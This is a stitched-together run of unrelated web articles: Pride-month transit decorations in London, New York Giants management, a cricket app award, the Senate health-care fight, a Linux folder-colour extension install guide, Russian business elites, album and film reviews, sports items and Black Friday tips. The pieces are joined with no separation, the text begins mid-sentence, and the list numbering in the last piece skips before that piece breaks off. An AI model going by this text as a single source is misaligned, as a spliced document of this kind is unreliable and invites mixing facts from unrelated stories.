In addition to exploring novel methods of curcumin administration to increase its absorption, they are also interested in identifying novel anti-inflammatory processes invoked by curcumin and in adapting those processes in the development of more potent curcumin analogues.
Transport for London
London's transport network is planning to wrap its vehicles and decorate the Underground with rainbow patterns as part of its biggest ever campaign for LGBT Pride.
To raise awareness for the campaign that champions the rights of the LGBT+ community, Transport for London is applying the colourful designs to its bus stops and at major Tube stations.
Fifty of the capital's Santander bikes have been adorned with the same pattern for this year's special anniversary event, which marks half a century since homosexuality was legalised in the UK.
And posters carrying the message of this year's 'Love Is Love' slogan are being pasted above entrances to the busy Oxford Street and Tottenham Court road Tube stations.
Transport for London
Pride organisers said they are more than ever promoting a "message of hope, acceptance, activism and love," with Sadiq Khan adding: "Here in London, you're free to love whoever you want to love and be whoever you want to be."
The Mayor of London said: "That's just one of the reasons why our city is seen as a beacon for the LGBT+ community and has such a vibrant, thriving scene - one that is bursting with colour, and contributes hugely to the life and soul of London."
The campaign's main draw, the Pride in London parade, falls on Saturday July 8, beginning at around 1pm. And the two weeks of Pride festivities run from Saturday June 24 until Sunday July 9.
Last year's parade drew about one million people to the capital's streets, with 40,000 partaking in the official parade.
The first official march was in 1972 and saw 2,000 men and women take part.
EAST RUTHERFORD, N.J. -- There is a feeling of unbalanced blame around the New York Giants this week. Why, when everyone seems to agree that the roster wasn't good enough to win, is coach Tom Coughlin the one who's leaving while general manager Jerry Reese gets to stay?
"Listen, we've had three losing years in a row, and a lot of that is due to some personnel decisions that have been made," Giants owner John Mara said Tuesday. "But I still believe that Jerry Reese is the right guy to lead us going forward. Why do I believe that? Jerry put together two Super Bowl-winning teams. I would venture to say, if we were to poll all of you in this room two years ago about whom the top general managers in the league are, every one of you would have him on your list. So now, two years later, after another bad season, do we want to throw all of that out? I still think he's capable of putting a great team together, and he's going to get that opportunity. I still have full confidence in him."

It's a pretty major stretch to credit Reese with the 2007 Super Bowl championship team, as he became the GM that year and most of the key pieces were put in place by his predecessor, Ernie Accorsi. And the 2011 team that won it again was a 9-7 team that took off when a lot of those remaining championship pieces woke up at just the right time late in the season. So Mara's inflating Reese's accomplishments a little bit.
But that's just the opinion of one sportswriter who probably wouldn't have answered Mara's theoretical 2014 poll the way he suggests. You can disagree with me on Reese; Mara does, and it's his team. So let's stick to the issue of why the Giants' GM position isn't fungible and the coaching one is.
The Giants have changed GMs twice in the past 37 years. George Young got the job in 1979, ceded it in 1998 to Accorsi, who held it until Reese took over in 2007. Accorsi worked for the Giants for three years before getting the big job. Reese worked for the Giants for 13 years before becoming the GM. The Giants' GMs come from within the family, from within the organizational structure. It's not a position they view as one they seek to change.
"I think that's part of our philosophy," Mara said. "If you still believe that the person has what it takes to build a winning team, you have to stay with him. You have to ride through the highs and lows and give him a chance. And he's going to have that opportunity."
He's going to have to do better with it. If you're going to credit Reese with the two Super Bowl titles, you also have to point out that the Giants have made the playoffs in only three of his nine seasons as GM. The Giants are 85-62 in those nine seasons (counting postseason games), but just 67-52 since the first two. Once the roster started reflecting Reese's drafts, the team began its slide into mediocrity.
"We have lost some credibility as an organization," Mara said.
That's the worst thing for an owner of a team like this, and it can't be allowed to linger. Mara said he has spoken with Reese and that Reese knows this is on him. Reese seemed a little less convinced Tuesday.
"The roster is up to me, and I take full responsibility for everything that's happened," Reese said in one breath. Then in the next: "Nobody has a perfect roster. But you have to manufacture wins in different ways. You've got to play the hand you're dealt, and you've got to win with it. We lost too many close games we had a chance to win."
That's something that would have been better for Reese to say in his head and not out loud on a day when the coach was heading out the door and he wasn't. But more important than what Reese said in a news conference is what he and the Giants can do from this point forward. He has a a ton of cap room and a second straight top-10 draft pick. He has the support of ownership. He'll get a say in picking the next coach.
There aren't a lot more safety nets for Reese here. The Giants have gotten rid of a coordinator, another coordinator and a head coach the past three offseasons. Eventually, if you keep going 6-10, the fact that your team hates to fire the GM isn't going to save you anymore.

Cricket app CricHQ is raising its bat after notching an international sports technology award.
In March, the Wellington company was nominated as a finalist in the Best-Integrated Digital Media category at the United Kingdom-based Sports Technology Awards.
Previous winners at the awards included the NBA, Wimbledon and AIG.
CricHQ's entry featured its recent acquisition of My Action Replay, which allowed teams to livestream their matches alongside live match data and infographics in the broadcast.

Last week, it won its category at a gala dinner in London, adding to a good run of nominations over the past year which included a win at the New Zealand Excellence in IT Awards, one at the CMO Asia Awards, and a highly commended nod at the Innovation Awards.

CricHQ founder Simon Baker said he was delighted to win the award given the calibre of other nominees and previous winners.
The sports-tech sector was taking off internationally, he said.
"The global broadcasting landscape is in a state of change and this creates a huge opportunity for CricHQ, our clients and 500 million online fans around the world who consume sport differently than previous generations.
SUPPLIED CricHQ founder Simon Baker says the award is recognition the company is on the right path.
"This award serves as great encouragement and recognition that we are on the right path by integrating video and audio into our platform."
International Cricket Council chief executive David Richardson, one of the judges for the awards, said CricHQ had driven technological advancements in cricket.
"Technology will continue to play an important role in the development and promotion of the game as we seek to engage future generations of players and fans."
The award followed CricHQ chairman Kevin Roberts in March claiming the company intended to become the world's largest broadcaster of cricket after it bought My Action Replay for an undisclosed sum.
Buying My Action Replay was CricHQ's first major decision since Roberts joined the company last December, going into bat for it with a seven-figure investment.
The Wellington-based sports technology company had been doing the rounds last year as it looked to raise another US$10 million (NZ$14 million), having attracted the same amount of investment from Singaporean firm Tembusu Partners last year.
Roberts, a former Saatchi & Saatchi executive chairman, said the Action Replay acquisition was the type of development which made CricHQ a leader in sports tech.
It claimed to record one in every 10 balls bowled in organised cricket globally, but was targeting one in every two within four years.
My Action Replay, meanwhile, has created more than 700,000 videos since it was established in 2013.
"By enabling fans and players to see video of cricket at all levels, we'll get to enjoy cricket in a whole new way," Roberts said.
"Effectively CricHQ intends on becoming the world's largest broadcaster of cricket."
Republicans are learning the ultimate lesson in policy-making: Overhauling the American health care system is a nearly impossible task.
Now comes an equally tricky part: contending with a disaffected, mad-as-hell base of supporters who expected them to follow through on a seven-year promise to repeal and replace Obamacare.
That's the reality the party is confronting after Senate Majority Leader Mitch McConnell's (R-KY) slim hopes of passing a reform package came crashing down once again on Monday when two conservative senators, Mike Lee of Utah and Jerry Moran of Kansas, announced they would vote against a procedural motion on the legislation.
McConnell now faces one of the most difficult obstacles of his decades-long career. His close aides fret that failure to pass some legislation could depress the Republican base and leave the party incredibly vulnerable in 2018. But no amount of procedural maneuvering or policy reshuffling has allowed him to crack the health care reform code. His options are limited and none are particularly confidence-inducing.
On Monday, McConnell announced that he would allow a vote on a proposal to repeal Obamacare immediately with a two-year window to come up with a replacement. It was a strategic gambit, designed to keep the raucous base at bay. Republican lawmakers voted in 2015 in favor of this approach. But they were assured then that President Obama would veto their effort, and in the current climate there is no guarantee—and, indeed, much doubt—that 50 members will say yes to this proposal.
Should that fail, McConnell could simply start over on Republican-authored reform. There are ideas out there. Most recently, Sens. Lindsey Graham (R-SC) and Bill Cassidy (R-LA) pitched a plan to send money to individual states and allow them to address their health care needs. But on Capitol Hill, their proposal has scant resonance.
Moreover, going this route risks the one commodity that McConnell doesn't have: time. The majority leader wants to get health care out of the way as soon as possible in order to move on to other legislative priorities, notably tax reform. Hitting the reset button now means months more of negotiations.
Another option for Senate Republicans is to bring Democrats to the table—something that Senate Minority Leader Chuck Schumer (D-NY) has barred his members from doing so long as Republicans have continued to push for a repeal of Obamacare. Last week, two Democratic senators told The Daily Beast that they have had preliminary conversations with some of their Republican counterparts about ways to fix the Affordable Care Act. They expect those talks to pick up once the GOP accepts the law's future in the immediate term.
“I think there's a whole lot of interest in getting this right… and the way to do that is to actually slow down the process and go regular order,” Sen. Tom Carper (D-DE) told The Daily Beast, suggesting that lawmakers should hold hearings, vote on specific amendments, and attempt to craft a bill with 60-plus votes.
Before Monday night, Sen. Susan Collins (R-ME) —one of the loudest critics of the bill's steep spending caps on Medicaid—was the only Republican calling for negotiations with Democrats. But shortly after Moran and Lee announced their opposition, Sen. John McCain (R-AZ), whose unexpected surgery last week caused McConnell to delay consideration of the bill, said in a statement that the Senate should return to regular order and move away from the current strategy of shutting out the minority party.
“The Congress must now return to regular order, hold hearings, receive input from members of both parties, and heed the recommendations of our nation's governors so that we can produce a bill that finally provides Americans with access to quality and affordable health care,” McCain said, echoing Schumer's calls for any legislation to be publicly debated.
This approach, however, may be more of a pipedream than the current one. McConnell has warned Republicans that he might have to work with Democrats on fixes if his own party can't come together. But those Republicans don't seem particularly interested in playing along. Asked, for instance, if he'd be open to holding hearings on the GOP bill, Sen. Pat Toomey (R-PA) told The Daily Beast that they were unnecessary.
“I don't think there's any need for that when the bill is public,” he said. “It's available to everyone to see, as people have not been shy about commenting on it.”
The wild card for McConnell, in the end, is not Schum er or his own party. It's President Trump.
Though he has been largely disconnected from the issue, Trump has gravitated toward the concept McConnell now endorses: repealing Obamacare now and replacing it at an unspecified later date. He first floated the idea more than two weeks ago.
“Republicans should just REPEAL failing ObamaCare now & work on a new Healthcare Plan that will start from a clean slate. Dems will join in!” he wrote on Twitter on Monday night shortly after Lee and Moran announced their opposition.
Trump also has spoken about letting the law fail, so as to bring Democrats to the negotiating table. Whether his administration follows through on that threat—and it has a fair amount of operational control over the law to do so—could very well determine McConnell's hand.
Either way, McConnell will have to make some tough choices in the days ahead, and he will have to do so knowing that the blowback will be on his members—not the president.
“I think Trump supporters will feel that they have been betrayed by politicians who say one thing and then do something completely opposite to what they have said,” said John Feehery, a longtime Republican operative. “I don't think they will blame Trump for this. I think they will blame the senators who have not kept their promises.”
Folder Color is a file manager extension that allows you to easily change folders icon color, useful for instance to organize your folders, make some important folder stand out, etc.
The latest Folder Color, which already supported Nautilus, adds support for Caja (the default MATE file manager) and Nemo (the default Cinnamon file manager):
Folder Color for Caja file manager
Folder Color for Nemo (with icons enabled in menus)
Until now, I maintained an unofficial version of Folder Color for Nemo, but because the WebUpd8 Nemo PPA only works with Ubuntu, Linux Mint users couldn't install it. Now that Folder Color officially supports Nemo, both Ubuntu and Linux Mint (Cinnamon) users can install this extension by using the official Folder Color PPA.
Folder Color is now themable, meaning that it is no longer restricted to the default Ubuntu / Linux Mint icon themes. Unfortunately, no icon themes support it for now, but Numix should support it soon;
support for small icon resolution (if for instance you're using grid/list view with zoom out);
icons in submenu: you can now see the actual folder color in the submenu, but firstly you need to enable icons in menu by using the following command: gsettings set org.gnome.settings-daemon.plugins.xsettings overrides "{'Gtk/ButtonImages': <1>, 'Gtk/MenuImages': <1>}" (to revert it, simply use "0" instead of "1" for ButtonImages and MenuImages).
Install Folder Color for Caja, Nemo or Nautilus in Ubuntu or Linux Mint
sudo add-apt-repository ppa:costales/folder-color sudo apt-get update
a) To install the Folder Color Nautilus extension and restart Nautilus, use the following commands:
sudo apt-get install folder-color nautilus -q
b) To install Folder Color for Nemo in Ubuntu or Linux Mint (Cinnamon edition) and restart Nemo, use the commands below:
sudo apt-get install folder-color-nemo nemo -q
c) To install Folder Color for Caja in Ubuntu (w/ MATE), To installin Ubuntu (w/ MATE), Ubuntu MATE or Linux Mint (MATE edition) and restart Caja, use the following commands:
sudo apt-get install folder-color-caja caja -q
If Folder Color doesn't show up in the Caja context menu, fix it by using the following command:
sudo ln -s /usr/lib/i386-linux-gnu/girepository-1.0/Caja-2.0.typelib /usr/lib/girepository-1.0/Caja-2.0.typelib
sudo ln -s /usr/lib/x86_64-linux-gnu/girepository-1.0/Caja-2.0.typelib /usr/lib/girepository-1.0/Caja-2.0.typelib

Paul Goble reports:
Most Russian businessmen prefer to keep their money in offshore banks and their children at foreign schools lest the businessmen be charged with corruption and lose everything, a Moscow specialist on Russian elites says, just one of the ways in which Russian government policies are promoting short-term thinking and undermining development.
Olga Kryshtanovskaya, the head of the Center for the Study of Elites at the Academy of Sciences Institute of Sociology, drew those and other conclusions during an interview with Svobodnaya Press on the basis of a survey of 25 leading Russian businessmen conducted by UBS and Camden Research.
Those two firms, which conducted the study for Vedomosti which published the results in its edition today, queried 25 Russians who own privately held businesses with annual turnover of 100 to 500 million US dollars in a broad range of fields. Among the more interesting results were the following: “72 percent are not considering the possibility of expansion abroad in the near future. But all except two are ready to sell their business for a good price and a little more than half are ready to do this in the next two to four years.”
Moreover, “84 percent of them keep their money abroad,” with “the most popular countries being Cyprus, Switzerland, and the Virgin Islands.” And most seek to live modestly – “only two have yachts” – “in order not to attract heightened attention to themselves and their money” by the powers that be. In addition to keeping their money abroad, “Vedomosti” reports, most also prefer to “educate their children” there “but they try to ensure that their offspring will not lose their national identity,” although most of them do not expect their children to continue the businesses their parents have founded.
“I don't want to hand over to my children the difficulties and uncertainties which accompany the management of a big business in Russia,” one of those polled said. “In this country, it isn't necessary to be an entrepreneur in order to become rich; it is simply necessary to get into the ruling circles: the bureaucrats make money.”
Marko Naumann, the co-director of the UBS-Camden survey, said that “Russians often operate as serial businessmen, building one company after another, very much like the situation in the United States” but very different than the one in Europe where “family businesses” often passed down “from generation to generation” predominate. Moreover, he continued, “wealthy Russians often do not want to hand over their businesses to children because they are not certain that the latter will be able to run them successfully in unstable times” or be able to cope with corruption and bureaucracy. Consequently, these owners themselves seldom plan “more than two years ahead.”
Commenting on these findings, Kryshtanovskaya, who has written widely on Russia's new elites, said that they show the fear most Russian businessmen have that “something will happen with their money and that someone will grab onto and take away that which they have up until now managed to keep.” Asked about the political ambitions of a group that has such short-term views, the Moscow sociologist says that their collective views are “very, very weakly expressed,” a reflection of their relative youth as a social group and their lack of a sense that “we are a force in the country and we can unite and put pressure” on the government. “This doesn't exist.”
“There is,” she says, “a desire to strive toward that but there is also an absolute lack of faith in their own forces and a fear, a fear of the powers that be. [These business owners] understand that this is a danger zone. Therefore, in considering the relative weight of this ambition and the fear of losing everything, fear still wins out.”
Until and unless the Kremlin can change that, not only encouraging Russian business owners to take a longer view about their own operations and to begin to feel their strength as a political group, all the talk about modernization is likely to remain just that, and both the money of Russian business owners and their children will continue to go abroad.

Two years. A relatively significant amount of time for an individual on this mortal coil (even if it does seem to pass in the blink of an eye!); especially where the creation of an album is concerned. Well, that's approximately how long it took today's artist to create his 1st full length album. Of course I'm talking about:
Codex by Frostbyte
Been a fan of this stellar electro/chipstep artist since mid-spring, right about the time he released the excellent Chip for Cancer compilation. Since then I haven't heard a single track by Frostbyte that didn't scream quality. Up until this point, however, it was all EPs and compilations. Not anymore. 10 amazing LSDj x2 tracks for your chippy listening pleasure, and not a one of them approaching filler content; ALL noteworthy compositions, which is one of the achievements that Frostbyte was striving so hard for with this album:
“It's my magnum opus you know? I wanted to make sure that it was going to make a statement, that it was going to be a solid, fully cohesive album; one that there's no filler tracks, where there's nothing that makes you want to skip a song.” Frosty goes on to say, “Basically I want it to be more than just an album. I want it to be a tribute to all that I've taken away from my time in the community; I've learned so much, met so many people, made so many friends. I've grown so much from the community, and this is my way of giving back.”
Personally, I believe that the extraordinarily talented kid succeeded in this grand endeavor, which is quite the amazing accomplishment. Did I mention that this is his very first full length album?!? =OOOOO Seriously, I can't even begin to pick a favorite track, and I can always pick a favorite track!!! (my answer to, “What's your favorite track, Brandon?” regarding this album is “YES.” ;3 ).
Also, if you can't afford the $7 price tag for the album, you can download a zip of the entire thing for free via Mediafire right here. You will, however, miss out on an extraordinary bunch of bonus content that only comes with the purchasable download on Bandcamp. So if you can buy it, I would strongly suggest that option. ;) Regardless of the way you chose to experience Codex, you're in for a real treat.

In a sure sign of progress, a high school has voted two gay teens as this year's "cutest couple." It represents the first time a same-sex couple has been allowed to run in the category at Carmel High School in Carmel, New York.
After fellow classmate Chelsea Blaney posted a picture of Brad Taylor and Dylan Meehan to her Tumblr announcing their win, the couple received an outpouring of support. To date, her post has been liked or reblogged more than 100,000 times.
"Two of my best friends won the cutest couple of our senior class. First time in my school history a same-sex couple has even been able to run for this category, not to mention winning it. So proud of them, and my school," she wrote.
Taylor and Meehan, who started dating a year ago, were surprised by all the attention, but were grateful they could serve as a source of inspiration.
"This whole thing has been a bit surreal for us because we have been raised to believe that love is love. We never realized that our happiness and openness would inspire so many individuals," they wrote in an email. "The support we have received from our family, friends and even strangers have led us to believe that our affection for each other is normal."
After so many stories of LGBT discrimination , it's nice to finally see one that ends happily.
In a rather predictable end result, top ten light heavyweight contender Sullivan Barrera (19-1, 14 KOs) stopped maybe not top fifty light heavyweight non-contender Paul Parker (8-2, 4 KOs) in the fifth round on HBO Latino Saturday night. This fight was only marginally more competitive than I thought it would be and the end record played out to script, but I actually strongly disagree with the ruling that led to the finish.
If nothing else, Paul Parker is a very tall, lanky fighter. He is also a competent pro, if not someone who will turn into a notable fighter. He was able to use this basic competence and physical advantage to occasionally land long, clean right hands on his much more accomplished opponent. I don't think he won a round necessarily, but he was there and competitive for almost three rounds. His best moment was a pretty big right at the end of the first. At the end of the third, however, Barrera landed a big right that seemed to really shake Parker mentally.
Round four saw Barrera begin to assert himself as his comparatively inexperienced opponent seemed to lose confidence, but it was not clean work that became the story. Late in the fourth, Barrera lunged in for a big right hand body shot. It connected, but much more notably his head connected directly on the chin of Paul Parker. The headbutt turned Parker's head exactly like a power punch would and he collapsed to the canvas. When he arose he was given five minutes, but he was clearly hurt and could audibly be heard telling the doctor he was dizzy.
The fight should have been stopped here and ruled a no contest. First and foremost, a fighter who complains of headaches or dizziness needs to immediately be pulled from a fight. Every few years we have a tragedy in the sport and these are universal symptoms in these cases. Also, as a sporting event, the fight was no longer fair. Parker had been seriously damaged by a blow outside of the rules of the contest. From that point he had to continue on in the bout on shaky legs.
Parker escaped the last few seconds of the fourth, but in the fifth he was clearly still affected by the accidental foul. Another headbutt hurt him again, but not as badly. After that the sort of right hand the Barrera had been landing to minor effect prior the the foul suddenly dropped Parker and finished the fight.
I am certainly not arguing for anything along the lines of a rematch. This was a stay busy matchup for Barrera that he would always win. He was going to win this bout without the foul and it certainly wasn't intentional. What I am arguing is that the wins and losses should not be on the record. Paul Parker was clearly badly damaged by an honest, accidental foul. He then complained about dizziness which was pretty visible in the moment as he stood unsteadily. In my view this was a textbook no contest, but I guess the point was to build Barrera's record a bit so he gets the W.

All of these years later, nobody has made a movie about Monica Lewinsky's affair with Bill Clinton, and I wish someone would hop to it. Sarah Silverman isn't getting any younger, people. But you can't beat my pick for the right guys to handle the job: Bobby and Peter Farrelly — at least if we could somehow time-zap 'em back to their prime. Closet innocence fans disguised as merchants of crass, they were so in sync with the Clinton era's Krispy Kreme gestalt that the nation's first (spiritually) 12-year-old president — if the Secret Service code name for the White House in Bill's instant-gratification heyday wasn't “The Cookie Jar,” it shoulda been — sometimes seems like a ghost character haunting their '90s movies. Heck, so does Monica.
Getting the sequel treatment with Dumb and Dumber To this week, Dumb and Dumber came first, followed by Kingpin (which the Farrellys didn't write) and then There's Something About Mary — their biggest hit, thanks mostly to Cameron Diaz's hair-gel misadventures with Ben Stiller's homemade Krispy Kreme icing.
The Movies of 1994 Grantland takes on a golden year in cinema.
Released the same year that a certain stain on someone's blue dress was getting the House GOP in an uproar, it must have been the first time someone's jism was employed as a sight gag in a mainstream comedy, forever cementing — well, so to speak — the Farrellys' rude-boy rep. But the movie's use of rock's ultimate Mr. Innocent, Jonathan Richman, as its singing narrator amounted to an admirably sneaky way of foregrounding old-fashioned schmaltz while making someone else responsible for voicing it. That way, it didn't intrude on the jokes.
As if demonstrating how fragile a gestalt can be, things started to go south with 2000's Me, Myself & Irene, a movie that nobody on either side of the camera seemed to have much heart for. (D&D star Jim Carrey probably didn't think he'd end up needing to go back to the Farrellys for a cred transfusion any more than they thought they'd need to go back to him for box office insurance, and neither camp got what it wanted.) Though the brothers recouped to some extent with Shallow Hal, an apologia for their own perceived callousness that might've turned painfully saccharine if not for Jack Black's mad-eyed zest in the title role, the old mojo has never returned in their later movies. Maybe they're waiting for Hillary.
In the meantime, I wish Dumb and Dumber To all the best, really I do. If nothing else, I'll bet sight unseen that it's less rotten than 2003's Dumb and Dumberer, which nobody from the original was involved in. But the odds are that the 2014 reprise wouldn't exist if the brothers, not to mention Carrey, couldn't really use a hit 20 mostly not-so-great years down the road. And I hope they don't mess up my memories of a movie that I think is close to perfect.
This side of, oh, Billy Wilder's Some Like It Hot, “perfect” is a word that doesn't get applied to post-1930s screen comedies, even beloved ones, too often. Let alone one that has Carrey's Lloyd Christmas fantasizing about charming the daylights out of a roomful of rich sophisticates, his inamorata included, by lighting his own farts. But there isn't a scene, including that one, or a performance that doesn't deliver exactly what the Farrellys want it to. You aren't sitting through weak ideas or misfired digressions to get to the good parts, the way we're all used to.
Considering that (a) the Farrellys had never directed before, and (b) Dumb and Dumber's tone is a lot trickier to sustain than it looks, the absence of vacillation and visibly panicky second thoughts about the whole premise is impressive. Yet what may be more remarkable is how the movie stays patently good-hearted without ever resorting to sentiment.
The goal is to get audiences feeling huge tenderness for people we're primed to think are ridiculous, and we do. But that doesn't mean they've grown any less ridiculous, because — well, at least back then — the brothers weren't big on redeeming anyone. Instead, the movie sets out to beguile us into cherishing them just as they are, the same way that John Waters used to with his more flagrant casts of freaks and oddballs.
♦♦♦
My guess is most of you won't need a plot refresher, but here it goes anyway. Lloyd and his best — that is, only — pal Harry (Jeff Daniels) start out sharing a forlorn pad in Providence, Rhode Island, working no-brainer jobs they keep getting fired from on the grounds of idiocy. Then Lloyd ends up in possession of a briefcase belonging to a rich Aspen gal named Mary (Lauren Holly), little knowing that he's just botched the ransom payoff intended for her husband's kidnappers.
Having instantly decided that he's moony about her, Lloyd talks Harry into driving to Colorado to return the briefcase, since his pard is the one with wheels — a van irresistibly outfitted to look like a literal shaggy dog, thanks to Harry's yen to open a pet-grooming store. Naturally, the kidnappers' hired guns — Mike Starr as Joe “Mental” Mentalino and Karen Duffy as his slinky accomplice, J.P. Shay — are in hot pursuit after panicking our boys, who think they're being dunned for an unpaid utilities bill, and decapitating Harry's pet parakeet on a visit to the pair's, ahem, lodgings.
The parakeet's posthumous fate — Lloyd sells it to a trusting blind boy after Scotch-taping its wee head back on — is the sickest joke in the movie. But if Dumb and Dumber celebrates anything, which it does, it's the slogan promoted by the hero of Kurt Vonnegut's Slapstick: “Lonesome no more!” Given how abject Lloyd and Harry are, isn't it great that they're a team? There's hope for misfits everywhere in that.

Sad sacks who prevail have been a screen staple since the silent era. But comedy duos usually depend on contrast to get laughs: goofball Jerry Lewis vs. urbane Dean Martin, dreamy Laurel vs. practical-minded Hardy, and so on. The Marx Brothers and the Farrellys' beloved Three Stooges play off the same friction in triplicate. That's why the beauty — and even, to some extent, the daring — of Dumb and Dumber is that Harry is only slightly less IQ-challenged than Lloyd, and spends a lot less time getting exasperated with him than sharing his wavelength and endorsing his dreams. Whatever becomes of these two, they'll never be able to complain that nobody understands them. That's the magnificent side of their duncey bond.
If you're in any doubt of how astute the Farrellys are about which relationship is the key one, recall the tellingly hands-off way that Lloyd's intended one and only is presented. Mary may be his love object, but she's not ours, despite her money and good looks — two assets the movie doesn't have a great deal of use for. (Neither one depends on personality, and that settles that.) It's no disappointment that Lloyd doesn't wind up with her; in fact, Dumb and Dumber would have an unhappy ending if he did. What we want is what we get: him and Harry on the road again, blithely bungling the opportunity of their dimwit lifetimes in one of the sweetest codas in movies.

Aside from There's Something About Mary, which plays a lot more by the rom-com rules — hair-gel jokes and all — most women I know are allergic to the Farrellys, which is no big surprise. Yet compared to the rancid gynophobia animating so many guy-oriented yuk-fests — or, hell, the culture at large — the brothers are sweetie pies.
Not that anyone's going to hire them to direct a Susan B. Anthony biopic anytime soon. In a way that's not only retro but consciously lunkheaded, they — just like their heroes — aren't unfond of women so much as bamboozled by their existence. Ever since Betty Friedan, every woman has known that mystification is dehumanization's pilot fish; not all of the reasons that frat boys love these movies are good ones, of course. And yet what keeps the Farrellys' version relatively innocuous is that it's never hostile. D&D's Mary may not be swooned over by the filmmakers, but she is kind to Lloyd at crunch time. The movie doesn't expose her as a selfish bitch to turn us against her, which would be the go-to stratagem if authentic yobs were in charge.
The Farrellys aren't often accused of being subtle. Nonetheless, it's worth noting how the values of what we weren't yet calling the 1 Percent are satirized almost exclusively via Lloyd and Harry's attempts to emulate them once our heroes discover — by mishap, needless to say — that the briefcase they've lugged across the country is stuffed with cash. The parody of Pretty Woman's shopping spree ridicules the audience's internalization of those values as well. Even Luis Buñuel might have cackled at the sight of Lloyd and Harry swanking it up in their eyesore finery.
Not accidentally, the switch also gives Carrey and Daniels oodles of fresh comedy business to play with right when they're close to exhausting the fun of the Lloyd-Harry partnership. Or Carrey is, anyhow, because he hasn't grasped — and really, never would — that a feature-length movie is something other than an extended skit. His costar is another story, and one of the treats of revisiting Dumb and Dumber is that the guy who gets my vote for best living American actor is in it.
Coming off Ace Ventura: Pet Detective and The Mask, Carrey was movieland's hottest marquee name at the time, so he naturally got most of the attention. But man, is Jeff Daniels a marvel. First off, he's got to make the duo's best-buds intimacy convincing pretty much on his own, because Carrey — with his stand-up-comic solipsism — never had any gift for playing off his castmates, let alone standing back to let them shine. It's the real reason he never developed as an actor; after he'd been at it a decade, it never occurred to Carrey to react to Kate Winslet in Eternal Sunshine of the Spotless Mind, even though she was tossing him vibrant stuff to die for. No wonder his big bids for Oscar consideration — The Truman Show, Man on the Moon — were solo turns.
While Carrey's shtick as Lloyd is often inspired — he works that chipped tooth and bowl haircut the way Peyton Manning manages a football — shtick is still what it is. You're never unconscious that he's doing a routine, which doesn't hurt the movie particularly. By contrast, Daniels doesn't have stardom's pressure to contend with. Doughy-faced and kudzu-haired (it's wonderful how the Mutt Cutts van and he resembles each other), he damn near convinces you that he's been Harry all of his life.
It's as incredible to remember that Daniels was fresh off playing noble Joshua Chamberlain in Gettysburg the year before as it is to realize he'd go on to incarnating, say, the smart-and-smarter parental dilemmas of The Squid and the Whale. But you'd have to be awfully pretentious to think that being the heart and soul of Dumb and Dumber is a lesser achievement. He's got moments — Harry helplessly cracking up as he asks Lloyd to kiss him, for instance — that are as lovely as any comic acting on film, and the movie could replace Carrey more easily (the young Adam Sandler might have done fine) than it could do without Daniels.
Funnily enough, Daniels is also the only member of Dumb and Dumber's talent pool whose career has stayed in the ascendant. (Let's forgive him The Newsroom; being a ventriloquist's dummy for Aaron Sorkin would put a damper on just about anybody's lust for life.) Carrey lost me well before his box office slide in the aughts, and he hasn't looked like being Jim Carrey strikes even him as much fun ever since Me, Myself & Irene added flop sweat to his manic mode. Much as I love the Farrellys, the last movie of theirs I paid any heed to was 2003's Stuck on You, which tried to resurrect their only real passion — telling the world what it's like to be brothers — by casting Matt Damon and Greg Kinnear as Siamese twins. But then, as Orson Welles coulda told them, it's not easy to regroup for the long game when your first movie said it all.

OAKS, Pa. (CBS) — As Philadelphia gets ready to launch its bike-share program tomorrow, Montgomery County was up-and-running today.
It's on a much smaller scale, but bicycles can now be rented with a smartphone app along two trails in the county.
The pilot program in Montgomery County calls for six bicycles at each of two docking stations — one in Oaks, at the Lower Perkiomen Valley Park, and the other in Lower Moreland, at the head of the Pennypack Trail.
County commissioners Josh Shapiro and Val Arkoosh strapped on helmets and became the first customers of the new program, renting bikes from the docking station in Oaks.
—–
Fellow commissioner Bruce Castor said the program is another plus for the county.
“It's not just for the person that doesn't have a bike, but the person who comes out here and doesn't feel like packing all their bike equipment here, or the person who gets here and says, ‘You know what, maybe I'll take a bike instead of walking on the trail,' ” Castor said.
The bikes are rented through a phone app from a company called Zagster. They handle maintenance and upkeep. Rentals are $5 per hour, or $25 for a day, with money used to maintain the bikes.
Company spokeswoman Regan Cleminson says each bike rental comes with a special bike lock:
“You can leave it right in your basket, and the idea with the u-locking technology is you can lock your bike anywhere mid-ride, so if you want to stop for lunch somewhere or use the restroom… whatever occurrences might happen along the way.”
Daniel Bryan says he plans to officially retire from the ring if the next neurologist he sees will not medically clear him to wrestle.
Bryan recently spoke with Meghan Sullivan of IGN.com to promote WWE 2K16 and of course was asked about his health. Bryan says he had a concussion back in April and WWE is hyper-sensitive about concussions right now. He got medically cleared by a neurologist who specializes in concussions, but WWE's Dr. Joseph Maroon wasn't convinced he should be wrestling.
“One neurologist who specializes in concussions — who was the neurologist for the Super Bowl last year — cleared me with no limitations. All my testing came back excellent,” he said. “But the WWE's medical doctor [Joe Maroon] is sceptical, because of my history of concussions and that sort of thing. So they will not clear me.” “They're going to send me to a third doctor at some point in the near future and that doctor will decide my fate.”
As badly as he wants to get back in the ring, Bryan said this third doctor's appointment will probably be the deciding factor in whether or not he has to retire. If the third doctor advises against him wrestling again, he will retire.
“The WWE doctor Joe Maroon [is] amazing and highly respected in the concussion field, and if they send me to a third neurologist who's also highly respected in the concussion field and they say literally no…well, then is it really smart to go against two doctors? I get all fired up…and then I'm like, maybe that's not the best thing for me and my family going forward.”
In the event that his days as an active competitor are over, Bryan says he's open to working with WWE in a non-wrestling capacity, possibly announcing or as a trainer.
Today's Thanksgiving. Or Black Friday Eve, as I know it. And Black Friday is serious business.
Wanna get in and out alive and with the prize? Then think of your competition as zombies. These rules from one of my favorite films, Zombieland, will keep you shopping:
1. Cardio
Have you been training? Ir not, you better start. Walk some laps after eating your turkey. And pace yourself tomorrow!
2. The Double Tap
Now, I'm not asking you to kill anyone, but instead refer to this as a “double check”. Double-check your coupons and lists… make sure you get everything you've come for!
3. Beware of Bathrooms
Are you a woman? Then stay clear of the bathrooms in malls and large stores. They're going to be PACKED, and that will take away from your prime shopping time. Go to the bathroom before you leave home, and try to stay clear of liquids.
4. Seatbelts
If you've tried to go to a mall anytime between Thanksgiving and Christmas before, you know the parking lights are CRAZY. And the drivers? Even crazier. Seatbelt up. Your life depends on it.
7. Travel Light
Traveling light doesn't mean you can't have a big bag with you: keep it fairly empty so you can store shopping bags and flyers in it. And keep it big enough to “accidentally” knock it into the person grabbing that last game console you want. (But I didn't tell you that.)
17. Don't Be a Hero
Know when to be a hero and when not to. Will that last action figure in Toys R Us make Christmas for a little boy or girl? Go for it. Are the streets icy and you're sleep deprived? Stay at home. Your friends and family want you happy and healthy way more than they want any material item!
18. Limber Up
